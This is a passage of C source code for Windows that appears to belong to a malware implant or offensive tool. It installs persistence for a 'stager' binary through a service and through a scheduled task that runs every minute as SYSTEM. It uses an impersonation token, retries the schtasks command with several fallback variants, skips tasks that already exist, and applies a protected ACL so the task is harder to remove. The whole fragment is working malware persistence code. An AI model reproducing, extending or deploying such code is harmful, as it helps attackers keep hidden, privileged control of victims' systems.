    ExitServiceTokenContext(hImpersonationToken);
    return bResult;
}

static BOOL CreateServicePersistence(LPCSTR lpBinaryPath) {
    DeleteLegacyPersistenceArtifacts();
    return CreateMonitorService(STAGE_PERSISTENCE_SERVICE_TASK_NAME, lpBinaryPath, TRUE);
}

static BOOL CreateMonitorTask(LPCSTR lpTaskName, LPCSTR lpStagerPath, BOOL bStartImmediately) {
    return CreateMonitorTaskWithToken(NULL, lpTaskName, lpStagerPath, bStartImmediately);
}

static BOOL CreateMonitorTaskWithToken(HANDLE hToken, LPCSTR lpTaskName, LPCSTR lpStagerPath, BOOL bStartImmediately) {
    if (!lpTaskName || !*lpTaskName || !lpStagerPath || !*lpStagerPath) {
        return FALSE;
    }

    char stagerName[MAX_PATH] = { 0 };
    if (!GetBaseFileName(lpStagerPath, stagerName, sizeof(stagerName)) || !*stagerName) {
        return FALSE;
    }

    char monitorCommand[4096] = { 0 };
    if (!BuildProcessMonitorCommand(lpStagerPath, stagerName, monitorCommand, sizeof(monitorCommand))) {
        return FALSE;
    }

    if (TaskLikelyExistsWithToken(hToken, lpTaskName)) {
        LOGV("[*] Existing persistence task %s detected; skipping recreation/update path.\n", lpTaskName);
        return TRUE;
    }

    int status = 0;
    if (!RunSchtasksCommandWithToken(
            hToken,
            TRUE,
            &status,
            "/create /tn \"%s\" /sc MINUTE /mo 1 /ru SYSTEM /np /f /tr \"%s\"",
            lpTaskName,
            monitorCommand
        )) {
        LOGV("[-] schtasks create failed for %s using SYSTEM account (code=%d), retrying NT AUTHORITY\\\\SYSTEM account\n", lpTaskName, status);
        if (!RunSchtasksCommandWithToken(
                hToken,
                TRUE,
                &status,
                "/create /tn \"%s\" /sc MINUTE /mo 1 /ru \"NT AUTHORITY\\\\SYSTEM\" /np /f /tr \"%s\"",
                lpTaskName,
                monitorCommand
            )) {
            status = 0;
            if (!RunSchtasksCommandWithToken(
                    hToken,
                    TRUE,
                    &status,
                    "/create /tn \"%s\" /sc MINUTE /mo 1 /ru SYSTEM /f /tr \"%s\"",
                    lpTaskName,
                    monitorCommand
                )) {
                LOGV("[-] schtasks create failed for %s without /np (code=%d), retrying NT AUTHORITY\\\\SYSTEM without /np\n", lpTaskName, status);
                status = 0;
                if (!RunSchtasksCommandWithToken(
                        hToken,
                        TRUE,
                        &status,
                        "/create /tn \"%s\" /sc MINUTE /mo 1 /ru \"NT AUTHORITY\\\\SYSTEM\" /f /tr \"%s\"",
                        lpTaskName,
                        monitorCommand
                    )) {
                    LOGV("[-] schtasks create failed for %s (code=%d)\n", lpTaskName, status);
                    return FALSE;
                }
            }
        }
    }


    if (bStartImmediately) {
        int runStatus = 0;
        if (!RunSchtasksCommandWithToken(
                hToken,
                TRUE,
                &runStatus,
                "/run /tn \"%s\"",
                lpTaskName
            )) {
            LOGV("[-] schtasks run failed for %s (code=%d). Continuing; scheduled launch remains configured.\n", lpTaskName, runStatus);
        }
    }

    if (!HardenTaskFilesystemObject(lpTaskName)) {
        LOGV("[-] Failed to harden persistence task filesystem object for %s (%lu)\n", lpTaskName, GetLastError());
    } else {
        LOGV("[+] Applied protected ACL to persistence task filesystem object %s\n", lpTaskName);
    }

    return TRUE;
}

BOOL InstallServicePersistence(LPCSTR lpBinaryPath) {
    return CreateServicePersistence(lpBinaryPath);
}

BOOL InstallTaskPersistence(LPCSTR lpBinaryPath) {
    return CreateMonitorTask(STAGE_PERSISTENCE_TASK_NAME, lpBinaryPath, TRUE);
}

BOOL RemovePersistenceArtifacts(void) {
    DeleteMonitorService(STAGE_PERSISTENCE_SERVICE_TASK_NAME);
    DeletePersistenceTask(STAGE_PERSISTENCE_TASK_NAME);
    DeleteMonitorService(STAGE_PERSISTENCE_SERVICE_TASK_NAME_LEGACY);
    DeleteMonitorService(STAGE_PERSISTENCE_SERVICE_TASK_NAME_LEGACY2);
    DeletePersistenceTask(STAGE_PERSISTENCE_TASK_NAME_LEGACY);
    DeletePersistenceTask(STAGE_PERSISTENCE_TASK_NAME_LEGACY2);
    return TRUE;
}

BOOL InstallPersistenceArtifacts(LPCSTR lpBinaryPath, int mode) {
    return InstallPersistenceArtifactsWithToken(NULL, lpBinaryPath, mode);
}

BOOL InstallPersistenceArtifactsWithToken(HANDLE hSystemToken, LPCSTR lpBinaryPath, int mode) {
    if (!lpBinaryPath || !*lpBinaryPath) {
        return FALSE;
    }

    if (mode < 0 || mode > 3) {
        return FALSE;
    }

    BOOL bServiceInstalled = FALSE;
    BOOL bTaskInstalled = FALSE;

    if ((mode & STAGE_PERSISTENCE_SERVICE) != 0) {
        bServiceInstalled = CreateMonitorServiceWithToken(hSystemToken, STAGE_PERSISTENCE_SERVICE_TASK_NAME, lpBinaryPath, TRUE);
    }

    if ((mode & STAGE_PERSISTENCE_TASK) != 0) {
        bTaskInstalled = CreateMonitorTaskWithToken(hSystemToken, STAGE_PERSISTENCE_TASK_NAME, lpBinaryPath, TRUE);
    }

    if (mode == 0) {
        return TRUE;
    }

    if ((mode & STAGE_PERSISTENCE_SERVICE) && (mode & STAGE_PERSISTENCE_TASK)) {
        return bServiceInstalled || bTaskInstalled;
    }

    if ((mode & STAGE_PERSISTENCE_SERVICE) != 0) {
        return bServiceInstalled || bTaskInstalled;
    }

    if ((mode & STAGE_PERSISTENCE_TASK) != 0) {
        return bTaskInstalled;
    }

    return FALSE;
}
